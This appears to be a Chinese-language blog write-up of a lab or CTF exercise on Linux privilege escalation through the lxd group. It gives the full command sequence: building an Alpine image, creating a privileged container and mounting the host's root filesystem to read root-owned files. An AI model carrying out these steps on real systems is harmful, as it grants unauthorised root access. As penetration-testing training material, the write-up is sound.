---
title: lxd组用户提权
published: 2025-03-09 16:40:49
tags: [内网安全,提权思路]
category: 安全
draft: false
---

# lxd组用户提权

`Linux Daemon`（`LXD`）是一个轻量级容器管理程序，而LXD是基于LXC容器技术实现的，而这种技术之前`Docker`也使用过。

## 靶机操作

1. 查看用户所属组
    
    ```bash
    hackable_3@ubuntu20:~$ id
    uid=1000(hackable_3) gid=1000(hackable_3) groups=1000(hackable_3),4(adm),24(cdrom),30(dip),46(plugdev),116(lxd)
    ```
    
2. 查看lxc和lxd是否存在
    
    ```bash
    hackable_3@ubuntu20:~$ which lxd
    /snap/bin/lxd
    hackable_3@ubuntu20:~$ which lxc
    /snap/bin/lxc
    ```
    

## 攻击机操作

1. `git` 克隆构建好的`alpine`到本地
    
    ```bash
    git clone https://github.com/saghul/lxd-alpine-builder.git
    ```
    
2. 执行`build -alpine` 命令完成最新的`Alpine`镜像构造（须由`root`完成）
    
    ```bash
    cd lxd-alpine-builder   
    sudo ./build-alpine
    ```
    
    ```bash
    hackable_3@ubuntu20:~/lxd-alpine-builder$ ls
    alpine-v3.13-x86_64-20210218_0139.tar.gz  build-alpine  LICENSE  metadata.yaml  README.md  rootfs  templates
    ```
    
3. 将压缩包发送到靶机

## 靶机操作

1. 将压缩包下载下来
2. 导入镜像并初始化镜像
    
    ```bash
    hackable_3@ubuntu20:~/lxd-alpine-builder$ lxc image import ./alpine-v3.13-x86_64-20210218_0139.tar.gz --alias test                                           
    Image imported with fingerprint: cd73881adaac667ca3529972c7b380af240a9e3b09730f8c8e4e6a23e1a7892b                                                            
    ```
    
    `lxd`初始化
    
    ```bash
    hackable_3@ubuntu20:~/lxd-alpine-builder$ lxd init                                                                                                           
    Would you like to use LXD clustering? (yes/no) [default=no]:                  
    Do you want to configure a new storage pool? (yes/no) [default=yes]:          
                                                                                                                                                                 
    Name of the new storage pool [default=default]: Name of the storage backend to use (lvm, ceph, btrfs, dir) [default=btrfs]:  
    Create a new BTRFS pool? (yes/no) [default=yes]:                              
    Would you like to use an existing empty block device (e.g. a disk or partition)? (yes/no) [default=no]:                                                      
    Size in GB of the new loop device (1GB minimum) [default=5GB]:                
    Would you like to connect to a MAAS server? (yes/no) [default=no]:            
    Would you like to create a new local network bridge? (yes/no) [default=yes]:  
    What should the new bridge be called? [default=lxdbr0]:                       
    What IPv4 address should be used? (CIDR subnet notation, “auto” or “none”) [default=auto]:                                                                   
    What IPv6 address should be used? (CIDR subnet notation, “auto” or “none”) [default=auto]:                                                                   
    Would you like the LXD server to be available over the network? (yes/no) [default=no]:                                                                       
    Would you like stale cached images to be updated automatically? (yes/no) [default=yes]                                                                       
    Would you like a YAML "lxd init" preseed to be printed? (yes/no) [default=no]:           
    ```
    
    初始化镜像
    
    ```bash
    hackable_3@ubuntu20:~/lxd-alpine-builder$ lxc init test test -c security.privileged=true
    Creating test 
    ```
    
3. 挂载镜像
    
    重要：就是将当前靶机的根目录挂载到容器的`/mnt/root` 上面去
    
    ```bash
    hackable_3@ubuntu20:~/lxd-alpine-builder$ lxc config device add test test disk source=/ path=/mnt/root recursive=true                                        
    Device test added to test  
    ```
    
4. 启动镜像并进入镜像就可以访问任意文件
    
    ```bash
    lxc start test
    lxc exec test /bin/sh
    ls -al /mnt/root/root/root.txt
    ```